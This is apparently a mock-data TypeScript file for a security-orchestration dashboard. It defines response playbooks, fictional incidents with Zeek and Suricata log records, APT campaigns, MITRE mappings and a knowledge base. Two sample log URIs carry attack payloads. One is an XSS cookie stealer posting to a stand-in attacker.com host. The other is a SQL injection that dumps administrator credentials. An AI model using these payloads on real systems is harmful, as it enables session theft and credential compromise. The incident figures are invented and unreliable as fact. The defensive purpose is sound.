import { Playbook } from "./playbooksConfig";

export interface MockIncident {
  id: string;
  name: string;
  attackType: "XSS" | "SQLi" | "Port Scan" | "Brute Force" | "DoS" | "Beaconing" | "Data Exfiltration" | "Unknown Anomaly";
  sourceIp: string;
  destinationIp: string;
  severity: "critical" | "high" | "medium" | "low";
  status: "New Alert" | "Investigating" | "Contained" | "Monitoring" | "Escalated" | "Closed";
  createdAt: string;
  fusionScore: number;
  zeekLog: any;
  suricataAlert: any;
  decisionFlow: {
    w1: number; // AI Weight
    s1: number; // AI Score
    w2: number; // IDS Weight
    s2: number; // IDS Score
    w3: number; // Protocol Weight
    s3: number; // Protocol Score
    confidence: number;
    finalDecision: string;
  };
  steps: string[];
  mitre: string;
}

export const initialPlaybooks: Playbook[] = [
  {
    id: "pb-1",
    name: "Auto-Isolate XSS Web Exploitation",
    description: "Detects Cross-Site Scripting Injection payloads inside incoming HTTP request parameters, evaluates via AI2B model and isolates.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "AI2B Web Attack Confidence Score > 0.90",
    executions: 184,
    updatedAt: "2 hours ago",
    severity: "critical",
    avgDurationMs: 112,
    confidenceThreshold: 90,
    riskScoreThreshold: 85,
    lastExecutionStatus: "success",
    lastExecutedTime: "2 HOURS AGO",
    actions: [
      { id: "p1-a1", step: 1, name: "HTTP Request Analysis", description: "Audit request cookies and headers for script tag signatures.", type: "email", status: "completed", target: "WAF_SEC_LOCK" },
      { id: "p1-a2", step: 2, name: "Block Host IP", description: "Inject firewall alias to ban requester IP for 2 hours.", type: "firewall", status: "completed", target: "pfSense_Edge" }
    ]
  },
  {
    id: "pb-2",
    name: "Mitigate SQL Injection Union Attack",
    description: "Detects unauthorized database query patterns, alerts administrators via Jira SecOps, and restricts administrative permissions.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "SQL Pattern Matching Engine Risk > 0.85",
    executions: 92,
    updatedAt: "1 day ago",
    severity: "critical",
    avgDurationMs: 145,
    confidenceThreshold: 85,
    riskScoreThreshold: 80,
    lastExecutionStatus: "success",
    lastExecutedTime: "1 DAY AGO",
    actions: [
      { id: "p2-a1", step: 1, name: "Log Database Queries", description: "Extract database transaction logs related to target session.", type: "jira", status: "completed", target: "SecOps_Ticketing" },
      { id: "p2-a2", step: 2, name: "Revoke API Role Session", description: "Temporarily downgrade IAM credentials of compromised route.", type: "aws_iam", status: "completed", target: "AWS_IAM_SEC" }
    ]
  },
  {
    id: "pb-3",
    name: "Block Dynamic TCP Port Sweep Scan",
    description: "Monitors network coordinates for TCP SYN sweeps on non-standard ports, automatically pushes offending source IPs to WAN block alias list.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "Unexplained Socket Connection REJ Ratio > 0.75",
    executions: 312,
    updatedAt: "3 hours ago",
    severity: "high",
    avgDurationMs: 64,
    confidenceThreshold: 80,
    riskScoreThreshold: 70,
    lastExecutionStatus: "success",
    lastExecutedTime: "3 HOURS AGO",
    actions: [
      { id: "p3-a1", step: 1, name: "Check Zeek Conn Log", description: "Confirm multiple non-established ports scanned within 1 second.", type: "isolate", status: "completed", target: "Zeek_Sensor_3" },
      { id: "p3-a2", step: 2, name: "Inject pfSense Block", description: "Establish firewall block rule for attacker IP", type: "firewall", status: "completed", target: "WAN_Block_Alias" }
    ]
  },
  {
    id: "pb-4",
    name: "Revoke Brute Force SSH Offender",
    description: "Identifies systemic password credential spraying on remote terminal ports, isolates target nodes via secure firewall profiles.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "Auth Failure Count > 30 within 60s",
    executions: 405,
    updatedAt: "Just now",
    severity: "high",
    avgDurationMs: 82,
    confidenceThreshold: 90,
    riskScoreThreshold: 80,
    lastExecutionStatus: "success",
    lastExecutedTime: "JUST NOW",
    actions: [
      { id: "p4-a1", step: 1, name: "SSH Session Termination", description: "Terminate active TCP sessions with SSH terminal daemon.", type: "isolate", status: "completed", target: "Internal_Bastion" },
      { id: "p4-a2", step: 2, name: "Alert SOC Team Slack", description: "Send compromise alerts containing active logins and source IP details.", type: "slack", status: "completed", target: "#sec-critical-alerts" }
    ]
  },
  {
    id: "pb-5",
    name: "Deflect SYN Flood DoS Attack",
    description: "Monitors connection establishment queues for half-opened TCP states, transitions gateway interfaces to rate-limiting proxy postures.",
    status: "active",
    triggerType: "manual",
    triggerCondition: "Half-Open Connections > 5000 / sec",
    executions: 28,
    updatedAt: "1 week ago",
    severity: "high",
    avgDurationMs: 198,
    confidenceThreshold: 75,
    riskScoreThreshold: 85,
    lastExecutionStatus: "warning",
    lastExecutedTime: "4 DAYS AGO",
    actions: [
      { id: "p5-a1", step: 1, name: "Engage SYN Cookies", description: "Instruct proxy nodes to require valid SYN Cookies authorization.", type: "isolate", status: "completed", target: "HAProxy_Load_Balancer" },
      { id: "p5-a2", step: 2, name: "Configure Rate Limiters", description: "Enable strict client flow speed restriction tables.", type: "webhook", status: "completed", target: "API_Gateway_Limiters" }
    ]
  },
  {
    id: "pb-6",
    name: "AI Beaconing C2 Connection Discovery",
    description: "Applies statistical analysis on outbound network logs to isolate periodic interval beacon behaviors signaling RAT infections.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "C2 Beacon Interval Coefficient of Variance < 0.05",
    executions: 15,
    updatedAt: "2 days ago",
    severity: "medium",
    avgDurationMs: 245,
    confidenceThreshold: 95,
    riskScoreThreshold: 70,
    lastExecutionStatus: "success",
    lastExecutedTime: "2 DAYS AGO",
    actions: [
      { id: "p6-a1", step: 1, name: "Capture Payload Samples", description: "Begin full PCAP logs of the suspected egress node channel.", type: "isolate", status: "completed", target: "Core_Switch_Mirror" },
      { id: "p6-a2", step: 2, name: "SOC Investigation Case Creation", description: "Alert L2 hunter team and open security case spreadsheet.", type: "jira", status: "completed", target: "L2_Threat_Hunting" }
    ]
  },
  {
    id: "pb-7",
    name: "Data Exfiltration Volume Detection",
    description: "Monitors outgoing transmission payloads on critical database segments, limits outgoing throughput speeds with prompt warnings.",
    status: "active",
    triggerType: "manual",
    triggerCondition: "Outbound bytes ratio of critical data assets > 10GB/hr",
    executions: 8,
    updatedAt: "3 days ago",
    severity: "critical",
    avgDurationMs: 290,
    confidenceThreshold: 90,
    riskScoreThreshold: 90,
    lastExecutionStatus: "failed",
    lastExecutedTime: "3 DAYS AGO",
    actions: [
      { id: "p7-a1", step: 1, name: "Throttle Data Flow", description: "Apply QoS pipeline speed throttle limits to DB egress gateway.", type: "isolate", status: "completed", target: "Core_ASA_Firewall" },
      { id: "p7-a2", step: 2, name: "Halt Temporary Sessions", description: "Disable external access privileges to data analytics platform.", type: "aws_iam", status: "completed", target: "AWS_Expt_Role" }
    ]
  },
  {
    id: "pb-8",
    name: "Unidentified Traffic Anomaly Resolver",
    description: "Triage vector clustering anomalies detected by AI models, generates deep investigative reporting profiles for SOC evaluation.",
    status: "inactive",
    triggerType: "manual",
    triggerCondition: "High Dimensional Anomaly Cluster Density > 4.2",
    executions: 41,
    updatedAt: "5 days ago",
    severity: "medium",
    avgDurationMs: 180,
    confidenceThreshold: 85,
    riskScoreThreshold: 60,
    lastExecutionStatus: "success",
    lastExecutedTime: "5 DAYS AGO",
    actions: [
      { id: "p8-a1", step: 1, name: "Extract Vector Variables", description: "Harvest coordinates details of abnormal data vectors.", type: "jira", status: "completed", target: "Anomaly_SOC_Board" }
    ]
  },
  // Supplementary Playbooks to achieve total > 20
  {
    id: "pb-9",
    name: "Kubernetes Cluster Pod Quarantine",
    description: "Isolates container pods exhibiting rapid anomalous system calls or network spikes.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "Kubelet Runtime Sys Call Deviation > 3.0",
    executions: 64,
    updatedAt: "Yesterday",
    severity: "high",
    avgDurationMs: 95,
    actions: []
  },
  {
    id: "pb-10",
    name: "Flush Compromised Remote DB Admin Access",
    description: "Instantly flushes remote administrator profiles and resets access keys when anomalous DB activity triggers.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "Anomalous Admin Execution on sensitive DB schema",
    executions: 12,
    updatedAt: "10 hours ago",
    severity: "critical",
    avgDurationMs: 104,
    actions: []
  },
  {
    id: "pb-11",
    name: "Deactivate Leaked AWS Secrets",
    description: "Detects exposed API keys inside public github or slack environments and revokes immediately.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "SecOps Git Monitor Alert matches AWS_ACCESS_KEY",
    executions: 76,
    updatedAt: "12 mins ago",
    severity: "critical",
    avgDurationMs: 40,
    actions: []
  },
  {
    id: "pb-12",
    name: "DNS Tunneling Payload Isolation",
    description: "Intercepts extreme TXT requests signaling covert outbound DNS tunneling vectors.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "DNS TXT Request Packet Size Mode > 250 Bytes",
    executions: 33,
    updatedAt: "4 hours ago",
    severity: "high",
    avgDurationMs: 155,
    actions: []
  },
  {
    id: "pb-13",
    name: "Block Spoofed Mail Domain Source",
    description: "Quarantines inbound emails failing DKIM/SPF checks on internal MX relays.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "SPF/DKIM Mismatch Count from similar domain > 5",
    executions: 119,
    updatedAt: "2 days ago",
    severity: "medium",
    avgDurationMs: 78,
    actions: []
  },
  {
    id: "pb-14",
    name: "Web Application Path Traversal Guard",
    description: "Identifies dot-dot-slash characters in HTTP requests and blocks the originating IP address.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "Request Path Matches Expression (\\.\\./)+",
    executions: 234,
    updatedAt: "6 mins ago",
    severity: "high",
    avgDurationMs: 50,
    actions: []
  },
  {
    id: "pb-15",
    name: "Local Privilege Escalation Containment",
    description: "Triggers on attempts to execute unauthorized sudo binaries within server shells.",
    status: "inactive",
    triggerType: "manual",
    triggerCondition: "Sudo Execution Failures on Non-Admin User > 3",
    executions: 9,
    updatedAt: "2 weeks ago",
    severity: "high",
    avgDurationMs: 130,
    actions: []
  },
  {
    id: "pb-16",
    name: "Active Directory Account Freeze Trigger",
    description: "Instructs LDAP directory to lock user directories upon detecting atypical credential logins.",
    status: "active",
    triggerType: "manual",
    triggerCondition: "Simultaneous Logins Across Geo Sectors > 1",
    executions: 19,
    updatedAt: "3 days ago",
    severity: "high",
    avgDurationMs: 140,
    actions: []
  },
  {
    id: "pb-17",
    name: "Phishing Attachment Quarantine Dispatch",
    description: "Deletes malicious matching hashes of recently identified phishing files inside all user inboxes.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "VirusTotal File Hash Scorch Indicator > 15",
    executions: 280,
    updatedAt: "5 hours ago",
    severity: "high",
    avgDurationMs: 350,
    actions: []
  },
  {
    id: "pb-18",
    name: "Ransomware Lateral Movement Block",
    description: "Limits file share protocols (SMB/NFS) on endpoints showing extreme frequency of file renovations.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "File Renaming frequency > 100 per minute",
    executions: 5,
    updatedAt: "4 weeks ago",
    severity: "critical",
    avgDurationMs: 120,
    actions: []
  },
  {
    id: "pb-19",
    name: "Outbound SSH Tunneling Detection",
    description: "Bans outbound SSH requests sent directly to external IP targets outside production VPC boundaries.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "Outbound TCP 22 destined to Non-Validated IP Addresses",
    executions: 87,
    updatedAt: "1 day ago",
    severity: "medium",
    avgDurationMs: 65,
    actions: []
  },
  {
    id: "pb-20",
    name: "Kubernetes Secret Exposure Audit",
    description: "Validates namespaces to prevent deployment pods from storing unencrypted secret references.",
    status: "active",
    triggerType: "manual",
    triggerCondition: "Kube Secrets Mount Missing Vault References",
    executions: 31,
    updatedAt: "Yesterday",
    severity: "medium",
    avgDurationMs: 400,
    actions: []
  },
  {
    id: "pb-21",
    name: "Unused Protocol Beacon Blockade",
    description: "Detects ICMP or UDP broadcast leakage indicating mapping or lateral device mapping.",
    status: "active",
    triggerType: "automated",
    triggerCondition: "ICMP Sweep Volume > 1000 Packets / min",
    executions: 48,
    updatedAt: "1 hour ago",
    severity: "low",
    avgDurationMs: 44,
    actions: []
  }
];

export const mockIncidents: MockIncident[] = [
  {
    id: "INC-9011",
    name: "XSS Infiltration Attempt Web Core API",
    attackType: "XSS",
    sourceIp: "104.244.75.112",
    destinationIp: "192.168.10.45",
    severity: "critical",
    status: "New Alert",
    createdAt: "2026-06-04 10:20:15 UTC",
    fusionScore: 94.8,
    zeekLog: {
      ts: "2026-06-04T10:20:15.012Z",
      uid: "C7gL8937sYm1v02",
      id_orig_h: "104.244.75.112",
      id_orig_p: 49231,
      id_resp_h: "192.168.10.45",
      id_resp_p: 443,
      uri: "/v1/auth/session/login?redirect=<script>alert(document.cookie);window.location='https://attacker.com/steal?c=' %2B document.cookie</script>",
      method: "POST",
      user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CyberSploitScanner/3.4",
      status_code: 200,
      request_body_len: 204
    },
    suricataAlert: {
      timestamp: "2026-06-04T10:20:15.014Z",
      flow_id: 198273645391,
      event_type: "alert",
      src_ip: "104.244.75.112",
      src_port: 49231,
      dest_ip: "192.168.10.45",
      dest_port: 443,
      proto: "TCP",
      alert: {
        action: "allowed",
        gid: 1,
        signature_id: 2018342,
        rev: 2,
        signature: "ET WEB_SPECIFIC_APPS XSS Payload Attempt inside Redirect Parameter",
        category: "Web Application Attack",
        severity: 1
      }
    },
    decisionFlow: {
      w1: 0.45,
      s1: 98.2, // AI1 web sensor
      w2: 0.35,
      s2: 100.0, // Suricata critical signature
      w3: 0.20,
      s3: 88.0, // Ingress pattern
      confidence: 96.4,
      finalDecision: "PROCEED_TO_AUTOMATIC_CONTAINMENT_XSS"
    },
    steps: [
      "Retrieve connection coordinates for sender (104.244.75.112)",
      "Extract Zeek http.log parameter matching UID 'C7gL8937sYm1v02'",
      "Examine AI2B Deep Classifier weight variables (98.2% confident)",
      "Sync with Suricata alert signature ID: 2018342",
      "Issue AWS network isolation command on targeted web group pool",
      "Inject dynamic block to pfSense WAN Gateway firewall rules table",
      "Deploy email notifications containing payload markers to site safety group"
    ],
    mitre: "T1190 - Initial Access: Exploit Public-Facing Application"
  },
  {
    id: "INC-9012",
    name: "SQLi Injection Union Exploit Attempt",
    attackType: "SQLi",
    sourceIp: "185.220.101.44",
    destinationIp: "192.168.10.45",
    severity: "critical",
    status: "Investigating",
    createdAt: "2026-06-04 09:44:12 UTC",
    fusionScore: 91.2,
    zeekLog: {
      ts: "2026-06-04T09:44:12.112Z",
      uid: "C7gL8937sYm1v05",
      id_orig_h: "185.220.101.44",
      id_orig_p: 58821,
      id_resp_h: "192.168.10.45",
      id_resp_p: 443,
      uri: "/api/v2/products/detail?id=-1' UNION SELECT 1,username,password,null,null FROM administrators--",
      method: "GET",
      user_agent: "Mozilla/5.0 sqlmap/1.8.2#stable (https://sqlmap.org)",
      status_code: 500,
      request_body_len: 0
    },
    suricataAlert: {
      timestamp: "2026-06-04T09:44:12.115Z",
      flow_id: 28475294519,
      event_type: "alert",
      src_ip: "185.220.101.44",
      src_port: 58821,
      dest_ip: "192.168.10.45",
      dest_port: 443,
      proto: "TCP",
      alert: {
        action: "allowed",
        gid: 1,
        signature_id: 2012034,
        rev: 4,
        signature: "ET WEB_SPECIFIC_APPS SQL Injection UNION SELECT command discovery",
        category: "Database Access Attempt",
        severity: 1
      }
    },
    decisionFlow: {
      w1: 0.40,
      s1: 96.5,
      w2: 0.40,
      s2: 95.0,
      w3: 0.20,
      s3: 75.0,
      confidence: 91.6,
      finalDecision: "EVALUATE_JIRA_CASE_ESCALATE_IAM_POLICY"
    },
    steps: [
      "Validate API query payload markers inside http.log URI parameters",
      "Check database error logs for matching syntax failure timestamps",
      "Compute AI Web Model vector classification indices (score: 96.5%)",
      "Inject immediate session lock for active application profile keys",
      "Dispatch incident summary to SecOps Jira board for Analyst review"
    ],
    mitre: "T1190 - Initial Access: Exploit Public-Facing Application"
  },
  {
    id: "INC-9013",
    name: "Host Scanning Discovery TCP Sweep",
    attackType: "Port Scan",
    sourceIp: "45.143.203.11",
    destinationIp: "192.168.10.15",
    severity: "medium",
    status: "Contained",
    createdAt: "2026-06-04 08:12:00 UTC",
    fusionScore: 78.4,
    zeekLog: {
      ts: "2026-06-04T08:11:59.998Z",
      uid: "C7gL8937sYm1v09",
      id_orig_h: "45.143.203.11",
      id_orig_p: 38210,
      id_resp_h: "192.168.10.15",
      id_resp_p: 8080,
      duration: 0.001,
      orig_bytes: 44,
      resp_bytes: 0,
      conn_state: "REJ",
      history: "Sr"
    },
    suricataAlert: {
      timestamp: "2026-06-04T08:12:00.002Z",
      flow_id: 4857291811,
      event_type: "alert",
      src_ip: "45.143.203.11",
      src_port: 38210,
      dest_ip: "192.168.10.15",
      dest_port: 8080,
      proto: "TCP",
      alert: {
        action: "allowed",
        gid: 1,
        signature_id: 2001211,
        rev: 1,
        signature: "ET SCAN Potential TCP Port Sweep host scan attempt",
        category: "Reconnaissance Scan",
        severity: 3
      }
    },
    decisionFlow: {
      w1: 0.30,
      s1: 82.0,
      w2: 0.30,
      s2: 60.0,
      w3: 0.40,
      s3: 88.0,
      confidence: 77.8,
      finalDecision: "AUTO_EDGE_FIREWALL_BLOCKLIST"
    },
    steps: [
      "Review target scanner source address characteristics (45.143.203.11)",
      "Audit Zeek connection log to determine scan frequency metrics",
      "Confirm REJ (Rejected) TCP flags indicative of active port scan mapping",
      "Run auto-block command on WAN interface via pfSense endpoint list",
      "Monitor repeat hits from the targeted network range to assess scale"
    ],
    mitre: "T1046 - Discovery: Network Service Discovery"
  },
  {
    id: "INC-9014",
    name: "Systemic SSH Auth Brute Force Campaign",
    attackType: "Brute Force",
    sourceIp: "213.152.17.89",
    destinationIp: "10.0.1.18",
    severity: "high",
    status: "New Alert",
    createdAt: "2026-06-04 10:11:42 UTC",
    fusionScore: 86.5,
    zeekLog: {
      ts: "2026-06-04T10:11:42.094Z",
      uid: "C7gL8937sYm1v20",
      id_orig_h: "213.152.17.89",
      id_orig_p: 41249,
      id_resp_h: "10.0.1.18",
      id_resp_p: 22,
      duration: 1.4,
      orig_bytes: 4210,
      resp_bytes: 2840,
      conn_state: "SF",
      history: "ShADdAFf"
    },
    suricataAlert: {
      timestamp: "2026-06-04T10:11:42.099Z",
      flow_id: 119283745,
      event_type: "alert",
      src_ip: "213.152.17.89",
      src_port: 41249,
      dest_ip: "10.0.1.18",
      dest_port: 22,
      proto: "TCP",
      alert: {
        action: "allowed",
        gid: 1,
        signature_id: 2001928,
        rev: 3,
        signature: "ET SCAN Multiple SSH Login Failures indicative of Brute Force",
        category: "Attempted User Privilege Gain",
        severity: 2
      }
    },
    decisionFlow: {
      w1: 0.35,
      s1: 89.0,
      w2: 0.35,
      s2: 85.0,
      w3: 0.30,
      s3: 85.0,
      confidence: 86.4,
      finalDecision: "REVOKE_SSH_ACCESS_IP_ISOLATION"
    },
    steps: [
      "Check local server auth logs for multiple SSH connection closures",
      "Verify auth failure status code patterns in terminal configuration",
      "Compile credentials used for mapping context (e.g. root, admin)",
      "Trigger AWS EC2 internal isolation sequence to sever interface bindings",
      "Deploy warning signals via Slack channel #sec-critical-alerts to engineers"
    ],
    mitre: "T1110 - Credential Access: Brute Force"
  },
  {
    id: "INC-9015",
    name: "DDoS SYN FLOOD Ingress Congestion",
    attackType: "DoS",
    sourceIp: "Multiple Bootnet IPs",
    destinationIp: "192.168.10.1",
    severity: "high",
    status: "Monitoring",
    createdAt: "2026-06-04 07:15:22 UTC",
    fusionScore: 89.0,
    zeekLog: {
      ts: "2026-06-04T07:15:22.011Z",
      uid: "C7gL8937sYm1v51",
      id_orig_h: "185.122.45.12",
      id_orig_p: 28410,
      id_resp_h: "192.168.10.1",
      id_resp_p: 80,
      duration: 0.0,
      orig_bytes: 40,
      resp_bytes: 0,
      conn_state: "S0",
      history: "S"
    },
    suricataAlert: {
      timestamp: "2026-06-04T07:15:22.012Z",
      flow_id: 99182736412,
      event_type: "alert",
      src_ip: "185.122.45.12",
      src_port: 28410,
      dest_ip: "192.168.10.1",
      dest_port: 80,
      proto: "TCP",
      alert: {
        action: "allowed",
        gid: 1,
        signature_id: 2011409,
        rev: 2,
        signature: "ET DOS Potential TCP SYN Flood Load Stress Detected",
        category: "Network Denial of Service",
        severity: 2
      }
    },
    decisionFlow: {
      w1: 0.30,
      s1: 91.0,
      w2: 0.40,
      s2: 85.0,
      w3: 0.30,
      s3: 92.0,
      confidence: 88.9,
      finalDecision: "ENGAGE_GATEWAY_SYN_PROXY_POST_ROUTING"
    },
    steps: [
      "Evaluate load balancer backlog queues and overall bandwidth limits",
      "Engage SYN cookies to enforce validation parameters on clients",
      "Deploy rate filter thresholds dynamically across reverse proxies",
      "Halt traffic blocks destined from untrusted ISP segments if required",
      "Configure cloud CDN shield rules to buffer ingress burst volumes"
    ],
    mitre: "T1498 - Impact: Network Denial of Service"
  },
  {
    id: "INC-9016",
    name: "Egress Periodic Beaconing C2 Connection",
    attackType: "Beaconing",
    sourceIp: "192.168.10.88",
    destinationIp: "88.99.141.22",
    severity: "medium",
    status: "New Alert",
    createdAt: "2026-06-04 10:02:11 UTC",
    fusionScore: 74.5,
    zeekLog: {
      ts: "2026-06-04T10:02:11.002Z",
      uid: "C7gL8937sYm1v67",
      id_orig_h: "192.168.10.88",
      id_orig_p: 54102,
      id_resp_h: "88.99.141.22",
      id_resp_p: 8443,
      duration: 0.45,
      orig_bytes: 512,
      resp_bytes: 256,
      conn_state: "SF",
      history: "ShADdfFr"
    },
    suricataAlert: {
      timestamp: "2026-06-04T10:02:11.005Z",
      flow_id: 7421893245,
      event_type: "alert",
      src_ip: "192.168.10.88",
      src_port: 54102,
      dest_ip: "88.99.141.22",
      dest_port: 8443,
      proto: "TCP",
      alert: {
        action: "allowed",
        gid: 1,
        signature_id: 2028211,
        rev: 1,
        signature: "ET MALWARE outbound connection with beaconing characteristics",
        category: "Command and Control Connection",
        severity: 2
      }
    },
    decisionFlow: {
      w1: 0.50,
      s1: 76.0,
      w2: 0.30,
      s2: 68.0,
      w3: 0.20,
      s3: 80.0,
      confidence: 74.4,
      finalDecision: "STAGE_COVERT_MIRROR_FOR_INTELLIGENCE"
    },
    steps: [
      "Track periodic delta timers of connections matching destination (88.99.141.22)",
      "Cross-check suspicious payload size uniformity inside transport logs",
      "Deploy mirror tracing on core switches to harvest full packet samples",
      "Notify Threat Hunting squad to review asset anomalies inside host memory"
    ],
    mitre: "T1102 - Command and Control: Web Service"
  },
  {
    id: "INC-9017",
    name: "Massive Infiltration Data Leak exfiltration",
    attackType: "Data Exfiltration",
    sourceIp: "192.168.10.12",
    destinationIp: "45.88.99.18",
    severity: "critical",
    status: "New Alert",
    createdAt: "2026-06-04 10:28:45 UTC",
    fusionScore: 93.5,
    zeekLog: {
      ts: "2026-06-04T10:28:45.022Z",
      uid: "C7gL8937sYm1v81",
      id_orig_h: "192.168.10.12",
      id_orig_p: 51224,
      id_resp_h: "45.88.99.18",
      id_resp_p: 21,
      duration: 320.4,
      orig_bytes: 14820194882, // 14.8 GB
      resp_bytes: 4120,
      conn_state: "SF",
      history: "ShADdFf"
    },
    suricataAlert: {
      timestamp: "2026-06-04T10:28:45.025Z",
      flow_id: 8829103422,
      event_type: "alert",
      src_ip: "192.168.10.12",
      src_port: 51224,
      dest_ip: "45.88.99.18",
      dest_port: 21,
      proto: "TCP",
      alert: {
        action: "allowed",
        gid: 1,
        signature_id: 2011942,
        rev: 2,
        signature: "ET POLICY Extreme Outbound FTP Transfer Volume Detected",
        category: "Potential Data Exfiltration Attempt",
        severity: 1
      }
    },
    decisionFlow: {
      w1: 0.40,
      s1: 94.0,
      w2: 0.40,
      s2: 92.0,
      w3: 0.20,
      s3: 95.0,
      confidence: 93.4,
      finalDecision: "EMERGENCY_DATA_PIPELINE_FLOW_HALT"
    },
    steps: [
      "Inspect outgoing packet volumes on critical asset coordinates",
      "Apply maximum QoS bandwidth filters at the network firewall gateway",
      "Temporarily lock user role and access credential lists of host endpoints",
      "Verify outbound transport protocol contents for encryption attributes"
    ],
    mitre: "T1048 - Exfiltration: Exfiltration Over Alternative Protocol"
  }
];

export const mockCampaigns = [
  {
    id: "camp-1",
    name: "APT-29 Campaign 'Cobalt Red'",
    attackers: ["45.143.203.11", "213.152.17.89", "104.244.75.112"],
    stages: [
      { step: "Recon & Surface Map", desc: "TCP Sweep host scans identified 4 live internal ports on segment 10.", status: "completed", epoch: "08:12:00" },
      { step: "Access Crack Attempt", desc: "Brute Force account login tries against the bastion node.", status: "completed", epoch: "10:11:42" },
      { step: "Web exploit & Injection", desc: "Crafted XSS redirect payloads injected onto principal auth gate.", status: "completed", epoch: "10:20:15" }
    ],
    impact: "High",
    state: "MITIGATED"
  },
  {
    id: "camp-2",
    name: "APT-41 Campaign 'Shadow Theft'",
    attackers: ["192.168.10.88", "192.168.10.12"],
    stages: [
      { step: "Establish Hold (C2)", desc: "Trigger periodic outbound command signals to capture nodes.", status: "completed", epoch: "10:02:11" },
      { step: "Data Harvest", desc: "Initiate bulk backup copying of administrative storage files recursively.", status: "completed", epoch: "10:15:30" },
      { step: "Alternative Outbound Leak", desc: "Covertly transfer 14.8GB payload out to anonymous FTP node.", status: "completed", epoch: "10:28:45" }
    ],
    impact: "Severe",
    state: "ACTIVE_CONTAIN"
  }
];

export const mitreTechniques = [
  { id: "T1190", tactic: "Initial Access", name: "Exploit Public-Facing Application", color: "#f43f5e", playbooks: ["pb-1", "pb-2", "pb-14"] },
  { id: "T1046", tactic: "Discovery", name: "Network Service Discovery", color: "#f59e0b", playbooks: ["pb-3", "pb-12"] },
  { id: "T1110", tactic: "Credential Access", name: "Brute Force", color: "#ef4444", playbooks: ["pb-4", "pb-15", "pb-16"] },
  { id: "T1498", tactic: "Impact", name: "Network Denial of Service", color: "#3b82f6", playbooks: ["pb-5"] },
  { id: "T1102", tactic: "Command and Control", name: "Web Service C2 Beaconing", color: "#8b5cf6", playbooks: ["pb-6", "pb-19", "pb-21"] },
  { id: "T1048", tactic: "Exfiltration", name: "Exfiltration Over Alternative Protocol", color: "#10b981", playbooks: ["pb-7", "pb-11", "pb-18"] }
];

export const effectivenessMetrics = {
  usage: [
    { name: "Week 1", "XSS": 12, "SQLi": 5, "Port Scan": 40, "Brute Force": 50, "DoS": 2, "C2/Beacon": 4 },
    { name: "Week 2", "XSS": 24, "SQLi": 8, "Port Scan": 32, "Brute Force": 41, "DoS": 5, "C2/Beacon": 7 },
    { name: "Week 3", "XSS": 18, "SQLi": 4, "Port Scan": 48, "Brute Force": 62, "DoS": 1, "C2/Beacon": 3 },
    { name: "Week 4", "XSS": 30, "SQLi": 11, "Port Scan": 55, "Brute Force": 58, "DoS": 8, "C2/Beacon": 9 }
  ],
  resolutionTimeHour: [
    { type: "Port Scan", withSoar: 1.2, withoutSoar: 24.5 },
    { type: "Brute Force", withSoar: 2.1, withoutSoar: 48.0 },
    { type: "XSS", withSoar: 3.4, withoutSoar: 32.2 },
    { type: "SQLi", withSoar: 4.0, withoutSoar: 40.5 },
    { type: "Beaconing", withSoar: 15.2, withoutSoar: 72.0 },
    { type: "Data Exfil", withSoar: 8.5, withoutSoar: 96.0 }
  ],
  falsePositiveRate: [
    { name: "Port Scan", rate: 5 },
    { name: "Brute Force", rate: 8 },
    { name: "XSS", rate: 12 },
    { name: "SQLi", rate: 14 },
    { name: "C2", rate: 19 },
    { name: "DoS", rate: 4 }
  ]
};

export const kbLibrary = [
  {
    attack: "XSS (Cross-Site Scripting)",
    description: "Inbound payload sequence injecting malicious HTML tags or script parameters inside public facing input endpoints (GET/POST structures).",
    indicators: [
      "Frequent requests containing URL entity mappings like '<script>' or '%3Cscript%3E'",
      "Large payload lengths carrying nested cookie stealers and redirect directives",
      "AI2B model issuing scoring parameters above 0.85 evaluation values"
    ],
    detectionMethods: "Apply regular expression rules inside WAF proxies, match request parameters with AI2B custom scoring indices, cross-check events against Suricata signature alerts.",
    mitre: "T1190 - Exploit Public-Facing Application"
  },
  {
    attack: "SQL Injection (SQLi)",
    description: "Input sequences structured to manipulate relational database queries. Typical patterns include character quotes, UNION keywords and database schema mapping operations.",
    indicators: [
      "Database error returns (Syntax errors near UNION/SELECT operations)",
      "Unbalanced quote characters in API endpoint path structures",
      "Web signatures alerts triggered by security layers"
    ],
    detectionMethods: "Enforce query parameterized controls, execute syntax validators inside web controllers, parse database access anomalies recursively.",
    mitre: "T1190 - Exploit Public-Facing Application"
  },
  {
    attack: "Port Scan & Host Discovery",
    description: "Malicious scanners executing host exploration sweeps sequentially to register open ports and host operating characteristics.",
    indicators: [
      "Extreme index of connection status values listed as REJ or OTH inside transport tables",
      "Single remote resource requesting sequential ports within narrow timing frames",
      "IDS rules generating host reconnaissance alarms"
    ],
    detectionMethods: "Enforce connection failure thresholds on border routers, crosscheck scan footprints against known scanning pools.",
    mitre: "T1046 - Network Service Discovery"
  },
  {
    attack: "SSH/RDP Brute Force",
    description: "Systemic authentication password cracking attempts executed on operational terminal access channels (TCP 22 or TCP 3389).",
    indicators: [
      "Multiple user logon failures logged in local syslog structures within short durations",
      "Atypical terminal session termination profiles",
      "Unidentified remote source IP addresses requesting connection authentication"
    ],
    detectionMethods: "Quarantine source addresses violating SSH access count limits, enforce LDAP dynamic lockout states, deploy zero-trust gateways.",
    mitre: "T1110 - Brute Force"
  },
  {
    attack: "Denial of Service (DoS)",
    description: "Ingress volume attack seeking to congest host server backlogs or pipe bandwidth with half-opened TCP states.",
    indicators: [
      "Large accumulation of connection states identified as S0 in connection tables",
      "Drastic increases in overall server ingress bandwidth and network latency values",
      "Widespread packet drop indicators from core router layers"
    ],
    detectionMethods: "Enforce SYN proxy verification rules inside router kernels, throttle non-valid client flow speeds dynamically, configure CDN caching profiles.",
    mitre: "T1498 - Network Denial of Service"
  },
  {
    attack: "Covert C2 Beaconing",
    description: "Compromised servers hosting backdoor software generating structured heartbeats to external command servers to fetch tasks.",
    indicators: [
